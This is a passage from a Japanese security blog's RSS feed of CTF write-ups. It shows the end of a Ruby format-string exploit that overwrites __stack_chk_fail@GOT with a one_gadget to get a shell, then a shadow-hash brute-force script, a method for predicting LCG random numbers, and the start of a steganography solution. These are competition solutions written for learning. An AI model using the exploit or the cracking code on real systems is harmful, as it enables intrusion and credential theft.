libc_start_main &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/BBB(.*)@@\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;chop&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;240&lt;/span&gt;
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_start_main &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;__libc_start_main&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base address = &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;libc_base&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

one_gadget &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
high &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff00000000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;32&lt;/span&gt;
low &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; one_gadget &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffffffff&lt;/span&gt;
llow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff0000&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;
hlow &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; low &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xffff&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwriting __stack_chk_fail@got to one gadget RCE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;high&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2c\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;hlow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x28\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;llow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2a\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4892c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>VolgaCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/volga2019/</link>
      <pubDate>Wed, 03 Apr 2019 08:07:43 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/volga2019/</guid>
      <description>

&lt;h2 id=&#34;shadow-cat&#34;&gt;Shadow cat&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;と&lt;code&gt;encrypted.txt&lt;/code&gt;が渡される&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;には、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、&lt;code&gt;encrypted.txt&lt;/code&gt;にはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;のパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;unix_crypt&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# gem install unix-crypt&lt;/span&gt;
org &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
ans &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
lines &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./shadow.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
lines&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
  org &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  enc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  
  &lt;span style=&#34;color:#666&#34;&gt;0x1f&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;upto(&lt;span style=&#34;color:#666&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
    hashpass &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;UnixCrypt&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;build(i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr, salt)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; hashpass &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; enc
      ans &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr
      &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Passed&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
  &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;

encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./encrypted.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chomp
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;VolgaCTF{&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;encrypted&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;tr(org&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;), ans&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>線形合同法で生成される乱数値を予測する</title>
      <link>https://owlinux1000.github.io/blog/post/predict_lcg/</link>
      <pubDate>Mon, 01 Apr 2019 22:33:26 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/predict_lcg/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;線形合同法（LCG）とは、至極一般的かつ簡易に実装することができる乱数生成手法の1つです。先日行われたVolgaCTF 2019では、この線形合同法により生成される乱数値を予測する問題（問題名LG）が出題されました。本問題ではx0 ~ x6に相当する6つの乱数が表示され、それを元に次の値を算出する問題です。&lt;/p&gt;

&lt;h2 id=&#34;線形合同法&#34;&gt;線形合同法&lt;/h2&gt;

&lt;p&gt;線形合同法は、以下の式で定義されます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;x1 = (a * x0 + c) % p&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このとき、x0は乱数のseed値、a, c, pがパラメータとなり適切な値を選びます。今回の問題では、x0 ~ x6までの値が与えられ、その次の値を入力するといったものでした。「a, c, pがわからないと無理じゃない？ｗ」と思ってしまったのですが、どうやら行列演算することで「a, c, p」を算出可能らしいです。&lt;/p&gt;

&lt;h2 id=&#34;線形合同法のパラメータの算出&#34;&gt;線形合同法のパラメータの算出&lt;/h2&gt;

&lt;p&gt;まずはじめに、各種x0 ~ x6を用いて以下の4つの行列を作成します。それらの行列式を用いて、各行列式の最大公約数(GCD)を算出します。これが、「p」に相当します。その後、(x3 - x4) と(x2 - x3)の法pにおける逆元を乗算し、再度pで割ると「a」になります。最後に、&lt;code&gt;(x4 - a * x3) % p&lt;/code&gt;で割った際の剰余がcになる。以上の計算を行うコードを以下に示す。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#coding: utf-8&lt;/span&gt;

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;math&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;numpy&lt;/span&gt; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;np&lt;/span&gt;

x0 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;64302589647963933737451564&lt;/span&gt;
x1 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;23099347408308738343740115&lt;/span&gt;
x2 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;60779187967701597680605077&lt;/span&gt;
x3 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;41531243105709646792416331&lt;/span&gt;
x4 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;71461317334046189800115379&lt;/span&gt;
x5 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;50094315434186546595562390&lt;/span&gt;
x6 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;27719142972686291997765807&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# なんかnp.linalg.detがエラー吐くので作成&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;det&lt;/span&gt;(matrix):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; matrix[&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;]

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;egcd&lt;/span&gt;(a, b):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; (b, &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt;:
        g, y, x &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; egcd(b &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; a, a)
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; (g, x &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; (b &lt;span style=&#34;color:#666&#34;&gt;//&lt;/span&gt; a) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; y, y)
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;modinv&lt;/span&gt;(a, m):
    g, x, y &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; egcd(a, m)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; g &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#d2413a;font-weight:bold&#34;&gt;Exception&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;modular inverse does not exist&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; m

matrix0 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x1 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

matrix1 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

matrix2 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x5 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

matrix3 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;array([
    [x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x5 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1],
    [x5 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x0, x6 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x1]
])

p0 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gcd(det(matrix0), det(matrix1))
p1 &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gcd(p0, det(matrix2))
p &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gcd(p1, det(matrix3))

a &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ((x3 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x4) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; modinv(x2 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; x3, p)) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (x4 &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x3) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x1 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x0 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x2 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x1 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x3 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x2 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x4 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x3 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x5 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x4 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;assert&lt;/span&gt; x6 &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; (a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x5 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Not eqaul&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;((a &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; x6 &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; c) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; p) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#=&amp;gt; 54571278391299526410540376&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;本記事では、線形合同法における乱数値の予測方法についてまとめた。パラメータが不明な場合でも本手法を用いることで解読なので覚えておきたい。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>PragyanCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/pragyan2019/</link>
      <pubDate>Sun, 10 Mar 2019 22:48:37 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/pragyan2019/</guid>
      <description>

&lt;h2 id=&#34;welcome&#34;&gt;Welcome&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;JPEGが渡されるが、binwalkをかけると中にzipがあるので取り出す&lt;/li&gt;
&lt;li&gt;取り出したzipを展開すると壊れたbmpとパスワード付きのzipが展開される&lt;/li&gt;
&lt;li&gt;bmpファイルの末尾にはbase64エンコードされたような文字列があるのでデコードするとzipのパスワード&lt;/li&gt;
&lt;li&gt;zipを展開するとpngファイルがでてくる&lt;/li&gt;
&lt;li&gt;stegosolveで適当にぽちぽちやるとFLAG&lt;/li&gt;
